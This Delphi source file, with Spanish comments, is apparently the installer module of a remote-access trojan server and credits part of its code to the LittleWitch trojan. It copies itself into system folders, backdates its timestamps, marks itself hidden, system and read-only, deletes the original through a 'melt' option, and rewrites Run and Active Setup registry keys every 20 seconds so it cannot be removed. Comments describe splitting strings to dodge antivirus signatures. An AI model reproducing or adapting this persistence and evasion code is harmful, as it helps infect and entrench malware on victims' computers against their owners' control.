unit UnitInstalacion;

interface

uses
  Windows,
  TLHelp32,
  ShellApi,
  vars,
  PsAPI,
  minireg,
  SHfolder,
  SettingsDef;

procedure Instalar();
function RutaProcesos(PID: DWORD): string;
function BorrarArchivo(s: string): boolean;
function stringreplace(s1:string;s2:string;s3:string):string;
function CreateDir(const Dir: string): Boolean;
function fileexists(const filename: string): boolean;
function lc(const S: string): string;//lower case
function inttostr(const value: integer): string;
Function StrtoInt(Const S: String): Integer;
function FindWindowsDir: string;
function FindSystemDir: string;
function FindTempDir: string;
function FindRootDir: string;
function GetSpecialFolderPath(folder : integer) : string;//appdir
implementation



var
  ThreadAutoInicioID: cardinal;

  
function inttostr(const value: integer): string;
var
  S:      string[11];
begin
  Str(Value, S);
  Result := S;
end;


Function StrtoInt(Const S: String): Integer;
Var
  E: Integer;
Begin
  Val(S, Result, E);
End;

procedure AutoInicio;
var
  Clave: string;
begin
  while True do
  begin
    //Ahora me agrego al autoinico
    //Metodo policies
    if Configuracion.bArranqueRun then
    begin
      //Separadita para que no se vea la string completa si se abre con un editor hexadecimal.
      //Me imagino que esto ayudara a la indetección de antivirus que usan firmas con strings.
      //Y si no, es por pura diversión :)

      Clave := 'SOFTWARE\Mic';
      Clave := Clave + 'rosoft\Wind';
      Clave := Clave + 'ows\CurrentVe';
      Clave := Clave + 'rsion\Run\';
      Clave := Clave + Configuracion.sRunRegKeyName;
       RegSetString(HKEY_CURRENT_USER, Clave, (Configuracion.sCopyTo + Configuracion.sFileNameToCopy)+' s');
    end;

    if(Configuracion.bArranqueActiveSetup) then
    begin

      Clave := 'Softw';
      Clave := Clave + 'are\Microsoft\Ac';
      Clave := Clave + 'tive Setup\In';
      Clave := Clave + 'stalled Components\';
      Clave := Clave + Configuracion.sActiveSetupKeyName+'\StubPath';
      RegSetString(HKEY_CURRENT_USER, Clave, (Configuracion.sCopyTo + Configuracion.sFileNameToCopy)+' s');
    end;
    
    Sleep(20000); //20 sec
  end;
end;

procedure CrearThreadAutoInicio;
//Crea un nuevo Thread en el que el server se agrega al auto inicio cada 20 segundos, para que no lo puedan borrar :)
begin
  BeginThread(nil, 0, @AutoInicio, nil, 0, ThreadAutoInicioID);
end;

function TerminarThreadAutoInicio: boolean;
  //Cierra el thread
begin
  Result := False;
  if ThreadAutoInicioID > 0 then
  begin
    EndThread(ThreadAutoInicioID);
    Result := True;
  end;
end;

procedure Instalar();
var
  i:    cardinal;
  hProcess: THandle;
  Process32: TProcessEntry32;
  SHandle: THandle;
  Pid:  string;
  Next: BOOL;

  FoundFile: TWin32FindData;
  //  H : THandle;
  FileTime:  TFileTime;

begin

    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
      '%WinDir%\', FindWindowsDir());
    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
      '%SysDir%\', FindSystemDir());
    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
      '%TempDir%\', FindTempDir());
    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
      '%RootDir%\', FindRootDir());
    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
      '%AppDir%\', GetSpecialFolderPath(CSIDL_LOCAL_APPDATA));
      
  if Configuracion.bCopiarArchivo then //Si me tengo que copiar entonces...
  begin
  

    //Si la carpeta no existe la intento crear

      try
        for i := 0 to 5 do
        begin
          CreateDir(Configuracion.sCopyTo);
          Sleep(10);
        end;
      except
      end;
    {if not DirectoryExists(Configuracion.sCopyTo) then
      Configuracion.sCopyTo := GetSpecialFolderPath(CSIDL_LOCAL_APPDATA));     }
    //Osea que no la pude crear y sigue sin existir. En ese caso me instalo en el %appdir%


    if lc(ParamStr(0)) <> lc(Configuracion.sCopyTo + Configuracion.sFileNameToCopy) then
      //Si no me he copiado
      //tengo que copiarme y ejecutar la copia
    begin
      if FileExists(Configuracion.sCopyTo + Configuracion.sFileNameToCopy) then
        //Osea que ya existe el archivo así que ya estoy instalado pero lo que pasa es que también estoy inyectado
      begin
        //Se podria comprobar en el futuro si realmente es el servidor o si ya existia antes
      end
      else
      begin
       //Ahora ya me pueedo instalar tranquilamente

      //lo copio en Configuracion.sCopyTo
      if(Configuracion.sInyectadorFile <> '') then//Estamos inyectados
        CopyFile(PChar(Configuracion.sInyectadorFile+''), PChar(Configuracion.sCopyTo +
          Configuracion.sFileNameToCopy), True)
      else
        CopyFile(PChar(paramstr(0)), PChar(Configuracion.sCopyTo +
          Configuracion.sFileNameToCopy), True);

      //Si tengo que modificar la fecha...
        if Configuracion.bCopiarConFechaAnterior then
        begin
          SHandle := FindFirstFile(PChar(Configuracion.sCopyTo + '*.*'), FoundFile);
          if SHandle <> INVALID_HANDLE_VALUE then
          begin
            while (string(FoundFile.cFileName) = Configuracion.sFileNameToCopy) or
            (string(FoundFile.cFileName) = '.') or (string(FoundFile.cFileName) = '..') do
              FindNextFile(SHandle, FoundFile);
            if SHandle <> INVALID_HANDLE_VALUE then
              FileTime := FoundFile.ftLastWriteTime;
          end
          else
          begin
            //No hay ningún archivo en la carpeta u ocurrió algun error, entonces escoga una fecha al azar
            FileTime.dwLowDateTime  := Random(4294967295);
            FileTime.dwHighDateTime := Random(4294967295);
          end;
          Windows.FindClose(SHandle);
          SHandle := CreateFile(PChar(Configuracion.sCopyTo +
            Configuracion.sFileNameToCopy), Generic_write, file_share_read or
            file_share_write, nil, open_existing, file_attribute_normal, 0);
          if SHandle <> INVALID_HANDLE_VALUE then
            SetFileTime(sHandle, @FileTime, @FileTime, @FileTime);
          CloseHandle(sHandle);
        end;

      //y lo pongo oculto, readonly y de sistema.
        i := GetFileAttributes(PChar(Configuracion.sCopyTo +
        Configuracion.sFileNameToCopy));
        i := i or $00000002;//faHidden;   //oculto
        i := i or $00000001;//faReadOnly; // solo lectura
        i := i or $00000004;//faSysFile;  //de sistema
        SetFileAttributes(PChar(Configuracion.sCopyTo + Configuracion.sFileNameToCopy), i);

      //Aqui ya estoy copiado, ejecuto el archivo copiado
        if Configuracion.bMelt = True then
        begin
          if(Configuracion.sInyectadorFile <> '') then//Estamos inyectados
            ShellExecute(GetDesktopWindow(), 'open',
          PChar('"' + Configuracion.sCopyTo + Configuracion.sFileNameToCopy + '"'),
          PChar('\melt ' + '"' + Configuracion.sInyectadorFile + '"'), nil, 0)
          else
          begin
            ShellExecute(GetDesktopWindow(), 'open',
          PChar('"' + Configuracion.sCopyTo + Configuracion.sFileNameToCopy + '"'),
          PChar('\melt ' + '"' + ParamStr(0) + '"'), nil, 0);
            exitprocess(0);
          end;
        end
        else

         if(Configuracion.sinyectadorfile = '') then //si no estamos inyectados tenemos que cerrar nuestro proceso
         begin
          ShellExecute(GetDesktopWindow(), 'open',
          PChar('"' + Configuracion.sCopyTo + Configuracion.sFileNameToCopy + '"'), 'i', nil, 0);
            exitprocess(0);
         end
         else
         begin
         end;

      end;

    end;
  end;

    CrearThreadAutoInicio;
end;

function stringreplace(s1:string;s2:string;s3:string):string;   { (copyto) windir DIR}
begin
s1 := lc(s1);
s2 := lc(s2);
s3 := lc(s3);

if(Pos(s2, 'a'+s1) - 1)>0 then
begin
result := s3+Copy(s1, length(s2)+1, length(s1)-length(s2));

end
else
result := s1;

end;


function BorrarArchivo(s: string): boolean;
  //Esta función la escribió aXLiTo
  //http://www.littlewitchtrojan.cjb.net/
  //y fue sacada de el código fuente de LittleWitch Trojan
var
  i: byte;
begin
  Result := False;
  if FileExists(s) then
    try
      //saco atributos para poder borrar un archivo sin importar que sea oculto, solo lectura o de sistema
      i := GetFileAttributes(PChar(s));
      i := i and $00000002;//faHidden;
      i := i and $00000001;//faReadOnly;
      i := i and $00000004;//faSysFile;
      SetFileAttributes(PChar(s), i);
      Result := DeleteFile(PChar(s));
    except
    end;
end;

function CreateDir(const Dir: string): Boolean;
begin
  Result := CreateDirectory(PChar(Dir), nil);
end;

function RutaProcesos(PID: DWORD): string;
var
  Handle: THandle;
begin
  Result := 'Desconocido';
  Handle := OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, False, PID);
  if Handle <> 0 then   //Si el proceso existe
    try
      SetLength(Result, MAX_PATH);
      begin
        if GetModuleFileNameEx(Handle, 0, PChar(Result), MAX_PATH) > 0 then
          //Obtenemos path del proceso
          SetLength(Result, length(PChar(Result)))
        else
          Result := 'Desconocido';
      end
    finally
      CloseHandle(Handle);
    end;
end;


function fileexists(const filename: string): boolean;
var
  FileData      :TWin32FindData;
  hFile         :Cardinal;
Begin
  hFile := FindFirstFile(pChar(FileName), FileData);
  If (hFile <> INVALID_HANDLE_VALUE) Then
  Begin
    Result := True;
    Windows.FindClose(hFile);
  End Else
    Result := False;
End;

function lc(const S: string): string;
const a=1;
var
Max, CharNo : Cardinal;
pResult : PChar;
begin
Max := Length(S);
SetLength(Result, Max);
if Max <= 0 then exit;
pResult := PChar(Result);
CharNo := 0;
repeat
pResult[CharNo] := S[CharNo+a];
if (S[CharNo+a]>= 'A') and (S[CharNo+a] <= 'Z') then
pResult[CharNo] := char(Ord(S[CharNo+a]) + 32);
Inc(CharNo);
until(CharNo>= Max);
end;


function FindWindowsDir: string;
  //retorna el directorio de windows
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetWindowsDirectory(PChar(Result), 255);
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then
      Result := Result + '\';
  end;
end;

function FindSystemDir: string;
  //retorna el directorio de windows
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetSystemDirectory(PChar(Result), 255);
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then
      Result := Result + '\';
  end;
end;

function FindTempDir: string;
  //retorna el directorio de los temporales
var
  DataSize: byte;
begin
  SetLength(Result, MAX_PATH);
  DataSize := GetTempPath(MAX_PATH, PChar(Result));
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then
      Result := Result + '\';
  end;
end;

function FindRootDir: string;
  //retorna el root del directorio de windows
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetWindowsDirectory(PChar(Result), 255);
  if DataSize <> 0 then
    Result := Copy(Result, 1, 3);
end;

function GetSpecialFolderPath(folder : integer) : string;
const
  SHGFP_TYPE_CURRENT = 0;
var
  path: array [0..MAX_PATH] of char;
begin
  if SUCCEEDED(SHGetFolderPath(0,folder,0,SHGFP_TYPE_CURRENT,@path[0])) then
    Result := path
  else
    Result := '';
    if Result[Length(Result)] <> '\' then
      Result := Result + '\';
end;


end.
